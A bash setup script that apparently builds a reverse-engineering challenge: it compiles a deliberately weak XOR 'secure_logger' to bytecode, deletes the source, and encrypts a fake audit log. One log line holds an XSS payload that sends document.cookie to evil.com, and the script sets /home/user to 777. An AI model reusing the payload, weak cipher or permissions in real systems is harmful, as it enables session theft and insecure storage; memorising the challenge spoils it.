#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    cat << 'EOF' > /tmp/secure_logger.py
import sys

def encrypt_log(data: bytes) -> bytes:
    key = b'COMPLIANCE'
    encrypted = bytearray()
    for i, byte in enumerate(data):
        # Weak custom cipher: XOR with key, then add index modulo 256
        encrypted.append((byte ^ key[i % len(key)] + i) % 256)
    return bytes(encrypted)

def write_log(text: str):
    with open('/home/user/encrypted_audit.bin', 'wb') as f:
        f.write(encrypt_log(text.encode('utf-8')))

if __name__ == '__main__':
    write_log(sys.argv[1])
EOF

    python3 -m py_compile /tmp/secure_logger.py
    mv /tmp/__pycache__/secure_logger.*.pyc /home/user/secure_logger.pyc

    cat << 'EOF' > /tmp/raw_audit.txt
[INFO] Application started in sandbox mode.
[INFO] User 'admin' authenticated successfully.
[WARN] Invalid input detected in search field.
[ERROR] Database query failed for input: <script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>
[INFO] Session terminated.
EOF

    python3 /tmp/secure_logger.py "$(cat /tmp/raw_audit.txt)"
    rm /tmp/secure_logger.py /tmp/raw_audit.txt

    chmod -R 777 /home/user
